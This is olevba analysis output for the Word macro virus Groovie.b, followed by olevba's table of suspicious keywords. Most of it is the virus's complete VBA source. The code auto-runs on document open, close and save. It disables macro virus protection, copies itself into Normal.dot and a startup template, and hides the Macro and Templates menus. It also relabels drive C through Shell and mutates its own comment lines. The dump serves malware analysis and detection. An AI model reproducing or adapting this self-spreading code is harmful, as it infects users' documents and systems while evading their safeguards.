olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-282258abe520a25c8d1ab028e963e8cbde97dbcd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-282258abe520a25c8d1ab028e963e8cbde97dbcd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO orbit.bas 
in file: Virus.MSWord.Groovie.b-282258abe520a25c8d1ab028e963e8cbde97dbcd - OLE stream: 'Macros/VBA/orbit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Public I02 As Boolean
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Public I03 As Boolean
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Public I04 As Boolean
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Public I05 As Boolean
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Public I06 As String
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Public I07 As Boolean
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Public I08 As Boolean
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Function I09()
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
On Error Resume Next
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If MacroContainer = NormalTemplate Then
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        I01 = "normal"
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        GoTo checkout
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    End If
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
checkout:
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
End Function
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Function I10()
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
On Error Resume Next
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    Next i
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    Next i
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
End Function
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Function I11()
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
On Error Resume Next
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Call I09
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Call I10
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If I01 = "document" Then Call I12
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If I01 = "normal" Then Call I13
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If I01 = "orbit" Then Call I14
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
End Function
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Function I12()
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
On Error Resume Next
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If I03 = False And I05 = False Then
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        With NormalTemplate.VBProject
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        End With
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        End With
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    End If
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If I02 = False Then
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        Shell ("label c: groovie"), 0
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        Windows(1).Close
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    End If
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
End Function
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Function I13()
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
On Error Resume Next
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Application.ScreenUpdating = False
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    Call I17
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If I04 = False And I07 = True Then
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        With ActiveDocument.VBProject
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        End With
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        End With
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        With Dialogs(wdDialogFileSummaryInfo)
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
            .Comments = "ALT-F11 says it's groovie!"
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
            .Execute
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        End With
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    End If
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If I02 = False And I07 = True Then
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    End If
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    If I02 = False And I07 = False Then
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        Documents.Add Template:="", NewTemplate:=False
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    End If
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Application.ScreenUpdating = True
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
End Function
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Function I14()
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
On Error Resume Next
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Application.ScreenUpdating = False
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        If I03 = False And I05 = False Then
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
            With NormalTemplate.VBProject
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
            End With
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
            End With
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
            NormalTemplate.Save
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        End If
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        If I04 = False Then
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
            With ActiveDocument.VBProject
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
            End With
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
            End With
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
            With Dialogs(wdDialogFileSummaryInfo)
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
                .Comments = "ALT-F11 says it's groovie!"
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
                .Execute
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
            End With
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
        End If
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Application.ScreenUpdating = True
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
End Function
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Function I15()
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
On Error Resume Next
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    Options.VirusProtection = False
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    Options.SaveNormalPrompt = False
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    Options.ConfirmConversions = False
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    I06 = ActiveDocument.FullName
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
    Call I11
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
End Function
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Sub AutoOpen()
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
On Error Resume Next
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Call I15
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
End Sub
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Sub AutoClose()
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
On Error Resume Next
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
I08 = True
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Call I15
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
End Sub
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Sub AutoExit()
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
On Error Resume Next
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Call I15
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
End Sub
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Sub FileSaveAs()
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
On Error Resume Next
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Call I16
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Call I15
 ' u6/21/2000 4:03:23 PM9user9Panasonic KX-P1121 on LPT1:
Dialogs(wdDialogFileSaveAs).Show
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
End Sub
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
Sub fileclose()
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
On Error Resume Next
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
I08 = True
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
Call I15
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
ActiveDocument.Close
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
End Sub
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
Sub fileprint()
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
On Error Resume Next
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
Call I15
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
Dialogs(wdDialogFilePrint).Show
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
End Sub
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
Sub ViewVBCode()
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
End Sub
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
Sub ToolsMacro()
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
End Sub
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
Sub FileTemplates()
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
End Sub
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
Function I17()
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
On Error GoTo docek
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
    If ActiveDocument.Name <> "" Then
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
        I07 = True
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
    End If
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
    GoTo over
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
docek:
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
    I07 = False
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
over:
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
End Function
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
Function I16()
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
Randomize
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
rn = Int(Rnd * 999)
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
For x = 2 To 358 Step 2
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
.DeleteLines x
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
Next x
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
End With
 ' u6/21/2000 4:03:24 PM9user9Panasonic KX-P1121 on LPT1:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

